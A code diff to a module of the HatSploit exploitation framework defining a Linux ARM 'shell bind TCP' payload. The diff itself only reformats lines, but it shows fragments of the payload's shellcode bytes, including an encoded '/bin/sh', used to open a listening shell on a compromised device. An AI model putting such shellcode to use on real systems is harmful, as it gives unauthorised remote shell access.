@@ -13,14 +13,12 @@ class HatSploitPayload(Payload, Socket):
     details = {
         'Name': "Linux armle Shell Bind TCP",
         'Payload': "linux/armle/shell_bind_tcp",
-        'Authors': [
-            'Ivan Nikolsky (enty8080) - payload developer'
-        ],
+        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
         'Description': "Shell bind TCP payload for Linux armle.",
         'Architecture': "armle",
         'Platform': "linux",
         'Rank': "high",
-        'Type': "bind_tcp"
+        'Type': "bind_tcp",
     }
 
     def run(self):
@@ -46,8 +44,7 @@ class HatSploitPayload(Payload, Socket):
             b"\x91\x42\xfa\xd1"
             b"\x03\xa0\xc1\x71"
             b"\x0b\x27\x01\xdf"
-            b"\x02\xff" + bind_port +
-            b"\x01\x01\x01\x01"
+            b"\x02\xff" + bind_port + b"\x01\x01\x01\x01"
             b"\x2f\x62\x69\x6e"
             b"\x2f\x73\x68\x58"
         )
